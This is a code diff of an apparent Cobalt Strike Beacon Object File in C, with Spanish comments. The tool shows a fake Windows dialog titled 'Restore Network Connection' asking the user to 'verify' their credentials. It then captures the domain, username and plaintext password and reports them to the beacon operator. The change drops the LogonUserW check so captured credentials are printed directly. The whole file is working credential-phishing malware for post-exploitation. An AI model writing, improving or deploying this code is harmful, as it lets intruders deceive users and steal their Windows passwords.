@@ -12,7 +12,7 @@
 #define REASON L"Restore Network Connection"
 #define MESSAGE L"Please verify your Windows user credentials to proceed."
 
-// === VARIABLES GLOBALES PARA PASAR DATOS DEL HILO ===
+// === GLOBALS ===
 WCHAR g_szUsername[MAXLEN] = {0};
 WCHAR g_szPassword[MAXLEN] = {0};
 WCHAR g_szDomain[MAXLEN] = {0};
@@ -54,14 +54,14 @@ BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
     return TRUE;
 }
 
-// === HILO SECUNDARIO: SOLO LOGICA, SIN PRINTS ===
+// === HILO SECUNDARIO (SOLO UN PARAM: title) ===
 DWORD WINAPI AskCreds(LPVOID lpParameter) {
-    LPCWSTR lpwReason = (LPCWSTR)lpParameter;
-    DWORD dwRet = ERROR_CANCELLED;
+    LPCWSTR lpwTitle = (LPCWSTR)lpParameter;
+    if (!lpwTitle || !lpwTitle[0]) lpwTitle = REASON;
 
     CREDUI_INFOW credUiInfo = {0};
     credUiInfo.cbSize = sizeof(credUiInfo);
-    credUiInfo.pszCaptionText = lpwReason;
+    credUiInfo.pszCaptionText = lpwTitle;
     credUiInfo.pszMessageText = MESSAGE;
     credUiInfo.hbmBanner = NULL;
     credUiInfo.hwndParent = USER32$GetForegroundWindow();
@@ -73,12 +73,10 @@ DWORD WINAPI AskCreds(LPVOID lpParameter) {
     ULONG inCredSize = 0, outCredSize = 0;
     BOOL bSave = FALSE;
 
-    // Obtener usuario actual
     if (!SECUR32$GetUserNameExW(NameSamCompatible, szUsername, &nSize)) {
         szUsername[0] = L'\0';
     }
 
-    // Empaquetar credenciales vacías
     if (!CREDUI$CredPackAuthenticationBufferW(CRED_PACK_GENERIC_CREDENTIALS, szUsername, L"", NULL, &inCredSize) &&
         KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
         inCredBuffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, inCredSize);
@@ -87,29 +85,22 @@ DWORD WINAPI AskCreds(LPVOID lpParameter) {
         }
     }
 
-    // Mostrar diálogo
-    dwRet = CREDUI$CredUIPromptForWindowsCredentialsW(
+    DWORD dwRet = CREDUI$CredUIPromptForWindowsCredentialsW(
         &credUiInfo, 0, &authPackage,
         inCredBuffer, inCredSize,
         &outCredBuffer, &outCredSize,
         &bSave, CREDUIWIN_GENERIC | CREDUIWIN_CHECKBOX
     );
 
-    // === GUARDAR RESULTADOS EN GLOBALES ===
     if (dwRet == ERROR_SUCCESS && outCredBuffer) {
         DWORD dwUser = MAXLEN, dwPass = MAXLEN, dwDomain = MAXLEN;
-        if (CREDUI$CredUnPackAuthenticationBufferW(0, outCredBuffer, outCredSize,
-            g_szUsername, &dwUser, g_szDomain, &dwDomain, g_szPassword, &dwPass)) {
-            // Datos guardados
-        }
+        CREDUI$CredUnPackAuthenticationBufferW(0, outCredBuffer, outCredSize,
+            g_szUsername, &dwUser, g_szDomain, &dwDomain, g_szPassword, &dwPass);
     }
 
     g_dwCredResult = dwRet;
 
-    // === LIMPIEZA ===
-    if (inCredBuffer) {
-        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, inCredBuffer);
-    }
+    if (inCredBuffer) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, inCredBuffer);
     if (outCredBuffer) {
         MSVCRT$memset(outCredBuffer, 0, outCredSize);
         OLE32$CoTaskMemFree(outCredBuffer);
@@ -121,93 +112,87 @@ DWORD WINAPI AskCreds(LPVOID lpParameter) {
 
 // === ENTRY POINT ===
 VOID go(IN PCHAR Args, IN ULONG Length) {
-    datap parser;
-    BeaconDataParse(&parser, Args, Length);
-    WCHAR wReason[256] = {0};
-    LPCWSTR lpwReason = REASON;
+// === EN go() ===
+datap parser;
+BeaconDataParse(&parser, Args, Length);
 
-    char* narrow = BeaconDataExtract(&parser, NULL);
-    if (narrow && narrow[0]) {
-        toWideChar(narrow, wReason, 256);
-        lpwReason = wReason;
+WCHAR wReason[256] = {0};
+LPCWSTR lpwReason = REASON;
+
+int len = BeaconDataLength(&parser);
+if (len > 0) {
+    char* src = BeaconDataExtract(&parser, &len);
+    if (src && len > 0) {
+        char temp[256] = {0};
+        int copy = min(len, 250);
+        MSVCRT$memcpy(temp, src, copy);
+        temp[copy] = '\0';
+
+        if (toWideChar(temp, wReason, 256)) {
+            lpwReason = wReason;
+        }
     }
+}
 
-    // Reiniciar estado
     g_bCredDone = FALSE;
     g_dwCredResult = ERROR_CANCELLED;
     g_szUsername[0] = g_szPassword[0] = g_szDomain[0] = L'\0';
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Mostrando prompt: %ls", lpwReason);
+    char buf[512];
+    MSVCRT$sprintf(buf, "[*] Título: %ls", lpwReason);
+    BeaconPrintf(CALLBACK_OUTPUT, "%s", buf);
 
-    // Limpiar ventanas previas
     USER32$EnumWindows(EnumWindowsProc, 0);
 
-    // === LANZAR HILO ===
     HANDLE hThread = KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AskCreds, (LPVOID)lpwReason, 0, NULL);
     if (!hThread) {
         BeaconPrintf(CALLBACK_ERROR, "CreateThread failed.");
         return;
     }
 
-    // === POLLING CON TIMEOUT (Sleep en principal = SEGURO) ===
     DWORD start = KERNEL32$GetTickCount();
     while ((KERNEL32$GetTickCount() - start) < (TIMEOUT * 1000)) {
         if (g_bCredDone) break;
         KERNEL32$Sleep(500);
     }
 
-    // === TIMEOUT ===
     if (!g_bCredDone) {
-        BeaconPrintf(CALLBACK_ERROR, "[TIMEOUT] Usuario no respondió. Cerrando ventana...");
+        BeaconPrintf(CALLBACK_ERROR, "[TIMEOUT]");
         USER32$EnumWindows(EnumWindowsProc, 0);
-        KERNEL32$TerminateThread(hThread, 1);
+        //KERNEL32$TerminateThread(hThread, 1);
     } else {
-        // === IMPRIMIR RESULTADOS (en hilo principal) ===
         if (g_dwCredResult == ERROR_SUCCESS) {
             WCHAR* fullUser = g_szUsername;
             WCHAR* domain = g_szDomain[0] ? g_szDomain : NULL;
             WCHAR* user = fullUser;
-            WCHAR* pass = g_szPassword;
 
-            // === SEPARAR DOMINIO\USUARIO SI EXISTE \ ===
             WCHAR* backslash = MSVCRT$wcschr(fullUser, L'\\');
             if (backslash) {
-                *backslash = L'\0';           // Separar
-                domain = fullUser;            // DOMINIO
-                user = backslash + 1;         // USUARIO
+                *backslash = L'\0';
+                domain = fullUser;
+                user = backslash + 1;
             } else if (!domain || !domain[0]) {
-                domain = L".";                // Local
+                domain = L".";
             }
 
-            // === VALIDAR CREDENCIALES ===
-            HANDLE hToken = NULL;
-            BOOL bValid = ADVAPI32$LogonUserW(
-                user,
-                domain,
-                pass,
-                LOGON32_LOGON_INTERACTIVE,
-                LOGON32_PROVIDER_DEFAULT,
-                &hToken
-            );
+            MSVCRT$sprintf(buf, "[+] Credential\n\tDomain: %ls\n\tUsername: %ls\n\tPassword: %ls", domain, user, g_szPassword);
+            BeaconPrintf(CALLBACK_OUTPUT, "%s", buf);
 
-            if (bValid && hToken) {
-                char buf[1024];
-                MSVCRT$sprintf(buf, "[+] Valid Credential\n\tDomain: %ls\n\tUsername: %ls\n\tPassword: %ls",
-                            domain, user, pass);
+            /*
+            HANDLE hToken = NULL;
+            if (ADVAPI32$LogonUserW(user, domain, g_szPassword, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken)) {
+                MSVCRT$sprintf(buf, "[+] Valid Credential\n\tDomain: %ls\n\tUsername: %ls\n\tPassword: %ls", domain, user, g_szPassword);
                 BeaconPrintf(CALLBACK_OUTPUT, "%s", buf);
                 KERNEL32$CloseHandle(hToken);
             } else {
                 DWORD err = KERNEL32$GetLastError();
-                char buf[1024];
-                MSVCRT$sprintf(buf, "[-] Invalid Credential (Error: %d)\n\tDomain: %ls\n\tUsername: %ls\n\tPassword: %ls",
-                            err, domain, user, pass);
+                MSVCRT$sprintf(buf, "[-] Invalid Credential (Error: %d)\n\tDomain: %ls\n\tUsername: %ls\n\tPassword: %ls", err, domain, user, g_szPassword);
                 BeaconPrintf(CALLBACK_ERROR, "%s", buf);
             }
-
-            // === LIMPIAR CONTRASEÑA ===
+            */
             MSVCRT$memset(g_szPassword, 0, sizeof(g_szPassword));
         } else if (g_dwCredResult == ERROR_CANCELLED) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[-] Usuario canceló.");
+            BeaconPrintf(CALLBACK_OUTPUT, "[-] Cancelado.");
         } else {
             BeaconPrintf(CALLBACK_ERROR, "[-] Error: %d", g_dwCredResult);
         }
